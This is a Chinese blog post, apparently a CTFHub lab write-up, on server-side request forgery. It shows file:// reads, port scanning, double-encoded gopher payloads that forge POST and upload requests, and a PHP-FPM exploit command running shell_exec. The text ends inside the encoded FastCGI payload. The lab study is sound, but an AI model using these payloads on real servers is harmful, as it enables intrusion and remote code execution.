@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>CTFHub-SSRF学习 - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="CTFHub-SSRF学习" />
+<meta property="og:description" content="0x00 前言 菜鸡记录汇总下SSRF的学习过程，这个题目设置的难度不合理，后四题贼简单，难度却最高。。。，就离谱。 0x01 内网访问 题目：尝试访问位于127" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-04-11T10:20:00+00:00" />
+<meta property="article:modified_time" content="2021-04-11T10:20:00+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="CTFHub-SSRF学习"/>
+<meta name="twitter:description" content="0x00 前言 菜鸡记录汇总下SSRF的学习过程，这个题目设置的难度不合理，后四题贼简单，难度却最高。。。，就离谱。 0x01 内网访问 题目：尝试访问位于127"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0/" /><link rel="prev" href="https://hannibal0x.github.io/2021-04-08-%E5%AE%89%E5%85%A8%E7%89%9B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><link rel="next" href="https://hannibal0x.github.io/2021-04-13-%E5%AE%89%E5%85%A8%E7%89%9Bxxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CTFHub-SSRF学习",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0\/"
+        },"genre": "posts","keywords": "Web安全, CTF","wordcount":  3669 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-04-11-ctfhub-ssrf%E5%AD%A6%E4%B9%A0\/","datePublished": "2021-04-11T10:20:00+00:00","dateModified": "2021-04-11T10:20:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CTFHub-SSRF学习</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%AD%A6%E4%B9%A0/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>学习</a>&nbsp;<a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>安全技术</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-04-11">2021-04-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3669 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-内网访问">0x01 内网访问</a></li>
+    <li><a href="#0x02-伪协议读取文件">0x02 伪协议读取文件</a></li>
+    <li><a href="#0x03-端口扫描">0x03 端口扫描</a></li>
+    <li><a href="#0x04-post请求">0x04 POST请求</a></li>
+    <li><a href="#0x05-上传文件">0x05 上传文件</a></li>
+    <li><a href="#0x06-fastcgi协议">0x06 FastCGI协议</a></li>
+    <li><a href="#0x07-redis协议">0x07 Redis协议</a></li>
+    <li><a href="#0x08-url-bypass">0x08 URL Bypass</a></li>
+    <li><a href="#0x09-数字ip-bypass">0x09 数字IP Bypass</a></li>
+    <li><a href="#0x0a-302跳转-bypass">0x0A 302跳转 Bypass</a></li>
+    <li><a href="#0x0b-dns重绑定-bypass">0x0B DNS重绑定 Bypass</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="0x00-前言">0x00 前言</h2>
+<p>菜鸡记录汇总下SSRF的学习过程，这个题目设置的难度不合理，后四题贼简单，难度却最高。。。，就离谱。</p>
+<h2 id="0x01-内网访问">0x01 内网访问</h2>
+<p>题目：尝试访问位于127.0.0.1的flag.php吧</p>
+<p>启动环境，url显示<code>xxxx/?url=_</code>，SSRF(Server-SideRequestForgery)是服务器端请求伪造，利用漏洞伪造服务器端发起请求，从而突破客户端获取不到数据限制。这道题，我们可以指定URL地址从而获取网页文本内容，所以直接改成<code>127.0.0.1/flag.php</code>即可。</p>
+<h2 id="0x02-伪协议读取文件">0x02 伪协议读取文件</h2>
+<p>题目：尝试去读取一下Web目录下的flag.php吧</p>
+<p>Web目录的路径是<code>/var/www/html/</code>，启动环境，url显示<code>xxxx/?url=_</code>，这题的考点应该是利用file协议读取本地文件，改为<code>file:///var/www/html/flag.php</code>，出现三个？，查看源代码，即可得到flag。</p>
+<h2 id="0x03-端口扫描">0x03 端口扫描</h2>
+<p>题目：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p>
+<p>使用Burp设置<code>/?url=127.0.0.1:§8000§</code>，在intruder设置PayLoad Type为number，From：8000To：9000，Step：1。发现在8462端口，长度有明显差异。<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" width="688" height="236" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-219.png" alt="" class="wp-image-1467" /> </figure></p>
+<h2 id="0x04-post请求">0x04 POST请求</h2>
+<p>题目：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p>
+<p>直接访问flag.php显示，Just View From 127.0.0.1，构造url变量，访问<code>url/?url=http://127.0.0.1/flag.php</code>，出现一个输入框，查看源码。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="526" height="97" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-208.png" alt="" class="wp-image-3153" /> </figure></p>
+<p>302是重定向又称之为暂时性转移，一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页经历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。不过302.php访问不了，不知道为啥。</p>
+<p>输入<code>url?url=file</code>:<code>///var/www/html/flag.php</code>查看下源代码，可以发现需要post一个key值。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-210.png" alt="" class="wp-image-3160" width="446" height="401" /> </figure></p>
+<p>需要利用gopher协议来构造post请求，post的数据包的格式大致如下：</p>
+<pre class="wp-block-code"><code>POST /flag.php HTTP/1.1
+Host: 127.0.0.1:80
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+
+key=882ba9ee8557373dce7b058bb80ed9d6</code></pre>
+<p>将上面的POST数据包先进行1次URL编码,<strong>URL编码的次数主要取决于你请求的次数</strong>，然后换行符是<code>%0d%0a</code>，把%0A替换成%0d%0A，结尾补上%0d%0A。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20127.0.0.1:80%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2036%0d%0A%0d%0Akey=882ba9ee8557373dce7b058bb80ed9d6%0d%0A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再进行一次URL编码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520127.0.0.1:80%250d%250AContent-Type:%2520application/x-www-form-urlencoded%250d%250AContent-Length:%252036%250d%250A%250d%250Akey=882ba9ee8557373dce7b058bb80ed9d6%250d%250A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后的利用curl<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-212.png" alt="" class="wp-image-3164" /></figure></p>
+<p>补充知识：</p>
+<pre class="wp-block-code"><code>-v     详细（在事件循环中打印错误/警告）
+-vv    非常详细（也打印客户端命令/ reponses ）
+-vvv   非常详细（也打印内部状态转换）</code></pre>
+<h2 id="0x05-上传文件">0x05 上传文件</h2>
+<p>题目：这次需要上传一个文件到flag.php了.祝你好运。</p>
+<p>构造<code>url?url=http://127.0.0.1/flag.php</code><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="209" height="73" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-213.png" alt="" class="wp-image-3168" /> </figure></p>
+<p>再利用file协议读一下源代码。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-214.png" alt="" class="wp-image-3169" width="457" height="245" /> </figure></p>
+<p>编辑下html，然后上传一个非空文件。</p>
+<pre class="wp-block-code"><code>&lt;form action="/flag.php" method="post" enctype="multipart/form-data"&gt;
+    &lt;input type="file" name="file"&gt;
+    &lt;input type="submit" value="上传"&gt;
+&lt;/form&gt;</code></pre>
+<p>利用bp抓包，出现Just View From 127.0.0.1。</p>
+<pre class="wp-block-code"><code>POST /flag.php HTTP/1.1
+Host: challenge-839040a464e49915.sandbox.ctfhub.com:10800
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------41538798404609826121560554440
+Content-Length: 218
+Origin: http://challenge-839040a464e49915.sandbox.ctfhub.com:10800
+Connection: keep-alive
+Referer: http://challenge-839040a464e49915.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php
+Upgrade-Insecure-Requests: 1
+
+-----------------------------41538798404609826121560554440
+Content-Disposition: form-data; name="file"; filename="1.txt"
+Content-Type: text/plain
+
+123
+-----------------------------41538798404609826121560554440--
+</code></pre>
+<p>经过一次url编码，%0A全部替换成%0d%0A</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20challenge-839040a464e49915.sandbox.ctfhub.com:10800%0d%0AUser-Agent:%20Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64;%20rv:91.0)%20Gecko/20100101%20Firefox/91.0%0d%0AAccept:%20text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8%0d%0AAccept-Language:%20zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%0d%0AAccept-Encoding:%20gzip,%20deflate%0d%0AContent-Type:%20multipart/form-data;%20boundary=---------------------------41538798404609826121560554440%0d%0AContent-Length:%20218%0d%0AOrigin:%20http://challenge-839040a464e49915.sandbox.ctfhub.com:10800%0d%0AConnection:%20keep-alive%0d%0AReferer:%20http://challenge-839040a464e49915.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php%0d%0AUpgrade-Insecure-Requests:%201%0d%0A%0d%0A-----------------------------41538798404609826121560554440%0d%0AContent-Disposition:%20form-data;%20name=%22file%22;%20filename=%221.txt%22%0d%0AContent-Type:%20text/plain%0d%0A%0d%0A123%0d%0A-----------------------------41538798404609826121560554440--%0d%0A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再经过一次url编码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520challenge-839040a464e49915.sandbox.ctfhub.com:10800%250d%250AUser-Agent:%2520Mozilla/5.0%2520(Windows%2520NT%252010.0;%2520Win64;%2520x64;%2520rv:91.0)%2520Gecko/20100101%2520Firefox/91.0%250d%250AAccept:%2520text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8%250d%250AAccept-Language:%2520zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2%250d%250AAccept-Encoding:%2520gzip,%2520deflate%250d%250AContent-Type:%2520multipart/form-data;%2520boundary=---------------------------41538798404609826121560554440%250d%250AContent-Length:%2520218%250d%250AOrigin:%2520http://challenge-839040a464e49915.sandbox.ctfhub.com:10800%250d%250AConnection:%2520keep-alive%250d%250AReferer:%2520http://challenge-839040a464e49915.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php%250d%250AUpgrade-Insecure-Requests:%25201%250d%250A%250d%250A-----------------------------41538798404609826121560554440%250d%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522;%2520filename=%25221.txt%2522%250d%250AContent-Type:%2520text/plain%250d%250A%250d%250A123%250d%250A-----------------------------41538798404609826121560554440--%250d%250A
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用gopher协议访问，成功得到flag。<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="755" height="37" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-215.png" alt="" class="wp-image-3173" /> </figure></p>
+<h2 id="0x06-fastcgi协议">0x06 FastCGI协议</h2>
+<p>题目：这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助</p>
+<p>提供了一个附件<a rel="noreferrer noopener" href="https://blog.csdn.net/mysteryflower/article/details/94386461" target="_blank" rel="nofollow" ><a href="https://blog.csdn.net/mysteryflower/article/details/94386461" target="_blank" rel="noopener noreffer ">https://blog.csdn.net/mysteryflower/article/details/94386461</a></a>，这里同样参考了<a href="https://www.soapffz.com/sec/ctf/566.html" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.soapffz.com/sec/ctf/566.html" target="_blank" rel="noopener noreffer ">https://www.soapffz.com/sec/ctf/566.html</a></a></p>
+<p><strong>Nginx（IIS7）解析漏洞</strong></p>
+<p>在用户访问 <code>http://127.0.0.1/favicon.ico/.php</code> 时，访问到的文件是 favicon.ico，但却按照.php 后缀解析了，而这个指定的文件涉及到的关键变量为 &ldquo;SCRIPT_FILENAME&rdquo;；正常来说，SCRIPT_FILENAME 的值是一个不存在的文件 /var/www/html/favicon.ico/.php，是 PHP 设置中的一个选项 fix_pathinfo 导致了这个漏洞。PHP 为了支持 Path Info 模式而创造了 fix_pathinfo，在这个选项被打开的情况下，fpm 会判断 SCRIPT_FILENAME 是否存在，如果不存在则去掉最后一个 / 及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p>
+<p><strong>PHP-FPM未授权访问漏洞</strong></p>
+<p>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</p>
+<p>在fpm某个版本之前，我们可以将<code>SCRIPT_FILENAME</code>的值指定为任意后缀文件，比如<code>/etc/passwd</code>；但后来，fpm的默认配置中增加了一个选项<code>security.limit_extensions</code>：</p>
+<pre class="wp-block-code"><code>security.limit_extensions = .php .php3 .php4 .php5 .php7</code></pre>
+<p>其限定了只有某些后缀的文件允许被fpm执行，默认是<code>.php</code>。所以，当我们再传入<code>/etc/passwd</code>的时候，将会返回<code>Access denied</code>。</p>
+<p>由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。</p>
+<p>万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用<code>find / -name &quot;*.php&quot;</code>来全局搜索一下默认环境，假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如<code>/usr/local/lib/php/PEAR.php</code>。</p>
+<p><strong>任意代码执行</strong></p>
+<p>PHP.INI中有两个有趣的配置项，<code>auto_prepend_file</code>和<code>auto_append_file</code>。<code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；<code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</p>
+<p>假设我们设置<code>auto_prepend_file</code>为<code>php://input</code>，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项<code>allow_url_include</code>）</p>
+<p><code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。这两个环境变量就是用来设置PHP配置项的，<code>PHP_VALUE</code>可以设置模式为<code>PHP_INI_USER</code>和<code>PHP_INI_ALL</code>的选项，<code>PHP_ADMIN_VALUE</code>可以设置所有选项。（<code>disable_functions</code>除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）</p>
+<p>环境变量：</p>
+<pre class="wp-block-code"><code>{
+    'GATEWAY_INTERFACE': 'FastCGI/1.0',
+    'REQUEST_METHOD': 'GET',
+    'SCRIPT_FILENAME': '/var/www/html/index.php',
+    'SCRIPT_NAME': '/index.php',
+    'QUERY_STRING': '?a=1&b=2',
+    'REQUEST_URI': '/index.php?a=1&b=2',
+    'DOCUMENT_ROOT': '/var/www/html',
+    'SERVER_SOFTWARE': 'php/fcgiclient',
+    'REMOTE_ADDR': '127.0.0.1',
+    'REMOTE_PORT': '12345',
+    'SERVER_ADDR': '127.0.0.1',
+    'SERVER_PORT': '80',
+    'SERVER_NAME': "localhost",
+    'SERVER_PROTOCOL': 'HTTP/1.1'
+    'PHP_VALUE': 'auto_prepend_file = php://input',
+    'PHP_ADMIN_VALUE': 'allow_url_include = On'
+}</code></pre>
+<p>设置<code>auto_prepend_file = php://input</code>且<code>allow_url_include = On</code>，然后将我们需要执行的代码放在Body中，即可执行任意代码。</p>
+<p>EXP：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener noreffer ">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></a></p>
+<pre class="wp-block-code"><code>usage: fpm.py &#91;-h] &#91;-c CODE] &#91;-p PORT] host file</code></pre>
+<p>执行命令</p>
+<pre class="wp-block-code"><code>python3 fpm.py -c "&lt;?php var_dump(shell_exec('ls /'));?&gt;" -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php</code></pre><figure class="wp-block-image size-full">
+<p><img loading="lazy" width="969" height="160" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-217.png" alt="" class="wp-image-3186" /> </figure></p>
+<p>利用hexdump或xxd查看数据流和元数据。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-219.png" alt="" class="wp-image-3189" width="470" height="507" /> </figure></p>
+<p>提出来后进行url编码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gopher://127.0.0.1:9000/_%2501%2501%2542%2549%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2542%2549%2501%25e7%2500%2500%250e%2502%2543%254f%254e%2554%2545%254e%2554%255f%254c%2545%254e%2547%2554%2548%2533%2537%250c%2510%2543%254f%254e%2554%2545%254e%2554%255f%2554%2559%2550%2545%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2574%2565%2578%2574%250b%2504%2552%2545%254d%254f%2554%2545%255f%2550%254f%2552%2554%2539%2539%2538%2535%250b%2509%2553%2545%2552%2556%2545%2552%255f%254e%2541%254d%2545%256c%256f%2563%2561%256c%2568%256f%2573%2574%2511%250b%2547%2541%2554%2545%2557%2541%2559%255f%2549%254e%2554%2545%2552%2546%2541%2543%2545%2546%2561%2573%2574%2543%2547%2549%252f%2531%252e%2530%250f%250e%2553%2545%2552%2556%2545%2552%255f%2553%254f%2546%2554%2557%2541%2552%2545%2570%2568%2570%252f%2566%2563%2567%2569%2563%256c%2569%2565%256e%2574%250b%2509%2552%2545%254d%254f%2554%2545%255f%2541%2544%2544%2552%2531%2532%2537%252e%2530%252e%2530%252e%2531%250f%251b%2553%2543%2552%2549%2550%2554%255f%2546%2549%254c%2545%254e%2541%254d%2545%252f%2575%2573%2572%252f%256c%256f%2563%2561%256c%252f%256c%2569%2562%252f%2570%2568%2570%252f%2550%2545%2541%2552%252e%2570%2568%2570%250b%251b%2553%2543%2552%2549%2550%2554%255f%254e%2541%254d%2545%252f%2575%2573%2572%252f%256c%256f%2563%2561%256c%252f%256c%2569%2562%252f%2570%2568%2570%252f%2550%2545%2541%2552%252e%2570%2568%2570%2509%251f%2550%2548%2550%255f%2556%2541%254c%2555%2545%2561%2575%2574%256f%255f%2570%2572%2565%2570%2565%256e%2564%255f%2566%2569%256c%2565%2520%253d%2520%2570%2568%2570%253a%252f%252f%2569%256e%2570%2575%2574%250e%2504%2552%2545%2551%2555%2545%2553%2554%255f%254d%2545%2554%2548%254f%2544%2550%254f%2553%2554%250b%2502%2553%2545%2552%2556%2545%2552%255f%2550%254f%2552%2554%2538%2530%250f%2508%2553%2545%2552%2556%2545%2552%255f%2550%2552%254f%2554%254f%2543%254f%254c%2548%2554%2554%2550%252f%2531%252e%2531%250c%2500%2551%2555%2545%2552%2559%255f%2553%2554%2552%2549%254e%2547%250f%2516%2550%2548%2550%255f%2541%2544%254d%2549%254e%255f%2556%2541%254c%2555%2545%2561%256c%256c%256f%2577%255f%2575%2572%256c%255f%2569%256e%2563%256c%2575%2564%2565%2520%253d%2520%254f%256e%250d%2501%2544%254f%2543%2555%254d%2545%254e%2554%255f%2552%254f%254f%2554%252f%250b%2509%2553%2545%2552%2556%2545%2552%255f%2541%2544%2544%2552%2531%2532%2537%252e%2530%252e%2530%252e%2531%250b%251b%2552%2545%2551%2555%2545%2553%2554%255f%2555%2552%2549%252f%2575%2573%2572%252f%256c%256f%2563%2561%256c%252f%256c%2569%2562%252f%2570%2568%2570%252f%2550%2545%2541%2552%252e%2570%2568%2570%2501%2504%2542%2549%2500%2500%2500%2500%2501%2505%2542%2549%2500%2525%2500%2500%253c%253f%2570%2568%2570%2520%2576%2561%2572%255f%2564%2575%256d%2570%2528%2573%2568%2565%256c%256c%255f%2565%2578%2565%2563%2528%2527%256c%2573%2520%252f%2527%2529%2529%253b%253f%253e%2501%2505%2542%2549%2500%2500%2500%2500
